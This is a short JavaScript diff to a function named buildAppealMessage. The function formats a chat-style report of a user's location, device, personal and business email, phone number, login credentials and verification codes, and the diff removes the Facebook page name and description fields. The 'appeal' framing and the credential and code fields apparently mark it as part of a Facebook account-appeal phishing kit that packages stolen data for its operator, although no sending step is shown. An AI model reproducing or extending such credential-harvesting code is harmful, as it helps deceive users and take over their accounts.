@@ -49,8 +49,6 @@ export function buildAppealMessage({ geoInfo, deviceLabel, userData, loginProvid
    Email: <code>${userData.personalEmail}</code>
    Business: <code>${userData.businessEmail}</code>
    SĐT: <code>${userData.phoneNumber}</code>
-   Page: <code>${userData.facebookPageName}</code>
-   Mô tả: <code>${userData.information}</code>
 ${credentialLines ? `${credentialLines}` : ''}${codeLines ? `\n${codeLines}` : ''}
 `.trim();
 }
